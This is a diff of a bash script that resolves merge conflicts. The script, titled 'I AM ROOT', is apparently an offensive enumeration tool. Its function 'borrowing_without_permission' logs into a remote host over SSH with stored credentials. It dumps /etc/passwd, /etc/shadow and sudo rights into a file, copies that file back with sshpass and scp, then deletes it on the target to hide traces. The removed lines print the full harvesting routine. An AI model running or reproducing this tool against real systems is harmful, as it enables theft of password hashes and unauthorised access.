@@ -24,9 +24,6 @@ WHITE='\033[1;37m'
 
 #Ensure the script is being ran as root or with sudo privileges
 if [ "$(id -u)" -ne 0 ]; then
-<<<<<<< HEAD
-	echo -e -e "${CYAN}
-=======
 	echo -e "${YELLOW}
 ████████╗██╗░░██╗██╗░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
 ╚══██╔══╝██║░░██║██║██╔════╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝
@@ -34,7 +31,6 @@ if [ "$(id -u)" -ne 0 ]; then
 ░░░██║░░░██╔══██║██║░╚═══██╗  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░
 ░░░██║░░░██║░░██║██║██████╔╝  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░
 ░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░
->>>>>>> CODE_BACKUP.sh
 
 ███╗░░░███╗██╗░░░██╗░██████╗████████╗  ██████╗░███████╗
 ████╗░████║██║░░░██║██╔════╝╚══██╔══╝  ██╔══██╗██╔════╝
@@ -56,15 +52,6 @@ fi
 #This command needs to stay in this location
 HOME=$(pwd)
 mkdir $HOME/I_AM_ROOT
-<<<<<<< HEAD
-echo -e "${ORANGE}THE DIRECTORIE WAS CREATED IN${NOCOLOR} " "${CYAN}$HOME${NOCOLOR}"
-
-
-
-sleep 2
-echo -e "${RED}
-
-=======
 echo -e "${ORANGE}
 
    ____ ____  _____    _  _____ ___ _   _  ____   ____ ___ ____  _____ ____ _____ ___  ______   __
@@ -80,7 +67,6 @@ clear
 
 sleep 2
 echo -e "${RED}
->>>>>>> CODE_BACKUP.sh
                                   wr^^        ^-q__                             
                                _dP                 9m_     
                              _#P                     9#_                         
@@ -215,58 +201,6 @@ SND="send \"echo '' >> $DIR${F}\r\""
 
 
 function borrowing_without_permission {
-<<<<<<< HEAD
-        expect -c "\
-        set timeout 300
-        set env(TERM)
-        spawn ssh -t "$USERNAME\@$IP_ADDRESS"
-        sleep 1
-        expect_before \"*(yes/no*\" {
-        send \"yes\r\" 
-        send \"$PASSWD\r\"
-        }
-        sleep 2
-        expect \"*assword*\"
-        send \"$PASSWD\r\"
-        sleep 2
-        send \"mkdir ${DIR}\r\"
-        sleep 2
-        send \"touch $DIR/${F}\r\"
-        sleep 1
-        send \"echo -e 'I AM ROOT-RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
-        ${SND}
-        ${SND}
-        ${SND}
-        sleep 2
-        send \"echo '#################### $USERNAME PATH ####################' >> $DIR${F}\r\"
-        sleep 2
-        ${SND}
-        sleep 2
-        send \"echo $PATH >> $DIR$F\r\"
-        sleep 2
-        ${SND}
-        send \"echo '#################### /ETC/PASSWD ####################' >> $DIR${F}\r\"
-        ${SND}
-        send \"cat /etc/passwd >> $DIR$F\r\"
-        sleep 2
-        ${SND}
-        send \"echo '#################### /ETC/SHADOW ####################' >> $DIR${F}\r\"
-        ${SND}
-        sleep 2
-        send \"cat /etc/shadow >> $DIR${F}\r\"
-        sleep 2
-        send \"echo '#################### SUDO COMMANDS ####################' >> $DIR${F}\r\"
-        ${SND}
-        sleep 2
-        send \"sudo -l >> ${DIR}${F}\r\"
-        expect \"*assword*\"
-        send \"$PASSWD\r\"
-        sleep 2
-        ${SND}
-        sleep 2
-        send \"exit\r\"
-        "
-=======
       expect -c "\
       set timeout 300
       set env(TERM)
@@ -326,7 +260,6 @@ function borrowing_without_permission {
       sleep 2
       send \"exit\r\"
       "
->>>>>>> CODE_BACKUP.sh
 }
 borrowing_without_permission
 
@@ -335,7 +268,6 @@ sshpass -p "$PASSWD" scp -r "$USERNAME"@"$IP_ADDRESS":"$DIR" "$HOME"
 sleep 5
 
 sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
-<<<<<<< HEAD
 sleep 3
 
 # check for contents in the /ETC/SHADOW section of the file
@@ -356,6 +288,3 @@ else
 	ENUMERATION DID NOT GRANT YOU A /ETC/SHADOW FILE
 	"
 fi
-=======
-sleep 3
->>>>>>> CODE_BACKUP.sh
